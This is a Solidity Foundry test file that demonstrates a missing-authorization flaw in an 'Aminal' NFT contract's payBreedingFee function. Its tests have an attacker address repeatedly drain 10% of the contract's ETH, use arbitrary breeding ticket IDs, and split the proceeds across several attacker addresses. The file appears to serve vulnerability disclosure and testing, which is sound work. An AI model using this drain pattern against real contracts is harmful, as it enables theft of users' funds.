// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {Aminal} from "src/Aminal.sol";
import {IGenes} from "src/interfaces/IGenes.sol";

/**
 * @title SimplePayBreedingFeeExploit
 * @notice Demonstrates the critical security vulnerability in payBreedingFee
 * @dev This shows how anyone can drain ETH from any Aminal
 */
contract SimplePayBreedingFeeExploit is Test {
    Aminal public vulnerableAminal;
    address public attacker = makeAddr("attacker");
    address public victim = makeAddr("victim");
    
    function setUp() public {
        // Create a vulnerable Aminal
        IGenes.Genes memory genes = IGenes.Genes({
            back: "Dragon",
            arm: "Strong",
            tail: "Long",
            ears: "Pointy",
            body: "Scaled",
            face: "Fierce",
            mouth: "Fire",
            misc: "Wings"
        });
        
        vulnerableAminal = new Aminal("VulnerableAminal", "VULN", "", genes);
        vulnerableAminal.initialize("ipfs://vulnerable");
        
        // Fund the Aminal (simulating a valuable NFT)
        vm.deal(victim, 100 ether);
        vm.prank(victim);
        (bool success,) = address(vulnerableAminal).call{value: 100 ether}("");
        require(success, "Failed to fund aminal");
        
        // Give attacker some gas money
        vm.deal(attacker, 1 ether);
    }
    
    function test_CRITICAL_AnyoneCanStealETH() public {
        console2.log("=== CRITICAL SECURITY VULNERABILITY DEMONSTRATION ===");
        console2.log("Aminal balance before attack:", address(vulnerableAminal).balance);
        console2.log("Attacker balance before:", attacker.balance);
        
        // ATTACK: Any external address can call payBreedingFee
        vm.startPrank(attacker);
        
        address[] memory recipients = new address[](1);
        recipients[0] = attacker;
        
        // First theft - 10% of 100 ETH = 10 ETH
        uint256 stolen1 = vulnerableAminal.payBreedingFee(recipients, 999999);
        console2.log("First theft amount:", stolen1);
        
        // Second theft - 10% of 90 ETH = 9 ETH
        uint256 stolen2 = vulnerableAminal.payBreedingFee(recipients, 123456);
        console2.log("Second theft amount:", stolen2);
        
        // Third theft - 10% of 81 ETH = 8.1 ETH
        uint256 stolen3 = vulnerableAminal.payBreedingFee(recipients, 0);
        console2.log("Third theft amount:", stolen3);
        
        vm.stopPrank();
        
        uint256 totalStolen = stolen1 + stolen2 + stolen3;
        console2.log("\nTotal stolen by attacker:", totalStolen);
        console2.log("Aminal balance after attack:", address(vulnerableAminal).balance);
        console2.log("Attacker balance after:", attacker.balance);
        
        // Verify the attack worked
        assertGt(totalStolen, 27 ether); // Should steal more than 27 ETH
        assertGt(attacker.balance, 27 ether); // Attacker should have the stolen funds
        
        console2.log("\n[VULNERABILITY] payBreedingFee has NO authorization checks!");
        console2.log("[IMPACT] Anyone can repeatedly drain 10% of any Aminal's ETH balance");
    }
    
    function test_NoBreedingTicketValidation() public {
        console2.log("=== BREEDING TICKET VALIDATION BYPASS ===");
        
        address[] memory recipients = new address[](1);
        recipients[0] = attacker;
        
        vm.startPrank(attacker);
        
        // These should all work with ANY ticket ID
        vulnerableAminal.payBreedingFee(recipients, 0);
        vulnerableAminal.payBreedingFee(recipients, type(uint256).max);
        vulnerableAminal.payBreedingFee(recipients, 42);
        
        vm.stopPrank();
        
        console2.log("[VULNERABILITY] No validation that breeding ticket exists");
        console2.log("[VULNERABILITY] No validation that this Aminal is part of the breeding");
    }
    
    function test_MultipleRecipientsAttack() public {
        console2.log("=== MULTIPLE RECIPIENTS ATTACK ===");
        
        // Attacker can use multiple addresses they control
        address attacker2 = makeAddr("attacker2");
        address attacker3 = makeAddr("attacker3");
        
        address[] memory recipients = new address[](3);
        recipients[0] = attacker;
        recipients[1] = attacker2;
        recipients[2] = attacker3;
        
        uint256 balanceBefore = address(vulnerableAminal).balance;
        
        vm.prank(attacker);
        uint256 stolen = vulnerableAminal.payBreedingFee(recipients, 1);
        
        console2.log("Amount stolen:", stolen);
        console2.log("Attacker1 received:", attacker.balance);
        console2.log("Attacker2 received:", attacker2.balance);
        console2.log("Attacker3 received:", attacker3.balance);
        
        // Verify 10% was stolen
        assertEq(stolen, balanceBefore / 10);
    }
}